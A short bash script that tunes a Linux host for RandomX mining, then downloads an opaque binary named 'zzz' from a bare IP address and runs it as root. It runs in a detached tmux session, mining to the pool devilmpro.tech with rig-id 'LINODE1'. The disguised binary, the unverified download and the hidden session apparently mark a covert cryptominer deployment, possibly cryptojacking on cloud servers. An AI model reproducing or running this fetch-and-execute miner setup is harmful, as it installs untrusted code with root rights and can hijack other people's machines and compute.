#!/usr/bin/env bash
sudo apt-get update 
sudo apt-get upgrade -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux msr-tools -y
sudo modprobe msr
sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
sudo chmod +x enable_1gb_pages.sh
sudo chmod +x randomx_boost.sh
sudo bash enable_1gb_pages.sh
sudo bash randomx_boost.sh
sudo wget http://51.38.98.168/papa/zzz
sudo chmod +x zzz
tmux new-session -d -s session 'sudo ./zzz -o devilmpro.tech:3330 --nicehash --donate-level=0 --randomx-1gb-pages --rig-id=LINODE1'



